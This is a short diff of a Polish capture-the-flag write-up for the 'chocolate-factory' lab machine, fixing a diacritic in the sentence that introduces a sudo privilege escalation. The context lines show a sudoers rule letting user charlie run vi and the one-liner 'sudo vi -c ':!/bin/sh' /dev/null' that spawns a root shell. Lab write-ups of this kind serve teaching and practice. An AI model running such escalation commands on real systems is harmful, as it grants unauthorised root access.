@@ -221,7 +221,7 @@ User charlie may run the following commands on chocolate-factory:
     (ALL : !root) NOPASSWD: /usr/bin/vi
 ```
 
-Wykorzystajmy fakt, że użytkownik charlie może wykonywac komednę vi jako root:
+Wykorzystajmy fakt, że użytkownik charlie może wykonywać komednę vi jako root:
 
 ```
 sudo vi -c ':!/bin/sh' /dev/null
